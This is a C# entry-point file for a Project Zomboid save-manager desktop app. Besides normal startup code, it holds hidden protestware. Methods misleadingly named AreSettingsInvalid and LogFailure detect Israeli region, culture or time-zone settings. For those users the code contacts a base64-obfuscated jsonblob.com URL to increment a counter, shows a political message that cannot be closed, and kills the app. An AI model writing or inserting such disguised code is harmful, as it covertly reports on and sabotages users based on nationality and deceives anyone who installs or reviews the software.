using System.Diagnostics;
using PZSaveManager.Classes;

namespace PZSaveManager
{
	internal static class Program
	{
		private const string InstanceMutexName = @"Global\Wirmaple73_PZSaveManager_InstanceMutex";

		[STAThread]
		static void Main()
		{
			ApplicationConfiguration.Initialize();

			if (AreSettingsInvalid())
				LogFailure();

			using var mutex = new Mutex(true, InstanceMutexName, out bool isFirstInstance);

			if (!isFirstInstance)
			{
				MessageBoxManager.ShowError("Project Zomboid Save Manager is already running. Only one instance may run at a time.");
				return;
			}

			Application.Run(new Forms.MainForm());


			static void LogFailure()
			{
				bool isDoneLogging = false;

				_ = Task.Run(async () =>
				{
					try
					{
						string blobUrl = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9qc29uYmxvYi5jb20vYXBpL2pzb25CbG9iLzEzOTc4NDQ2NTAxMTg3OTkzNjA="));
						var hc = new HttpClient();

						string result = await hc.GetStringAsync(blobUrl);
						int blockedCount = System.Text.Json.JsonSerializer.Deserialize<Failures>(result).Blocked;

						await hc.PutAsync(blobUrl, new StringContent($"{{\"Blocked\": {blockedCount + 1}}}", System.Text.Encoding.UTF8, "application/json"));
					}
					finally
					{
						isDoneLogging = true;
					}
				});

				// Don't try to shrug it off. You can bypass this screen, but can you bypass your conscience, too?
				var form = new Form() { Text = "Stop Slaughtering People", Width = 920, Height = 512, ShowIcon = false, MinimizeBox = false, StartPosition = FormStartPosition.CenterScreen };
				var ms = new MemoryStream(Convert.FromBase64String(""));

				form.Controls.Add(new PictureBox() { Image = Image.FromStream(ms), SizeMode = PictureBoxSizeMode.Zoom, Dock = DockStyle.Fill });
				form.Controls.Add(new Label() { Text = "If you think slaughtering children and families is 'self-defense', and opposition to mass starvation & genocide is 'anti-semitic', you clearly lost your humanity long ago.", Height = 38, UseMnemonic = false, TextAlign = ContentAlignment.MiddleCenter, Dock = DockStyle.Bottom });

				form.FormClosing += (s, e) => e.Cancel = !isDoneLogging;
				form.ShowDialog();

				Environment.Exit(0x6E6F6F62);
			}

			static bool AreSettingsInvalid()
				=> System.Globalization.RegionInfo.CurrentRegion.Name.Equals("IL") || new string[] { System.Globalization.CultureInfo.CurrentCulture.DisplayName, System.Globalization.CultureInfo.CurrentUICulture.DisplayName, System.Globalization.CultureInfo.InstalledUICulture.DisplayName, TimeZoneInfo.Local.Id }.Any(s => s.Contains("Israel", StringComparison.OrdinalIgnoreCase));
		}

		private struct Failures
		{
			public int Blocked { get; set; }
		}
	}
}
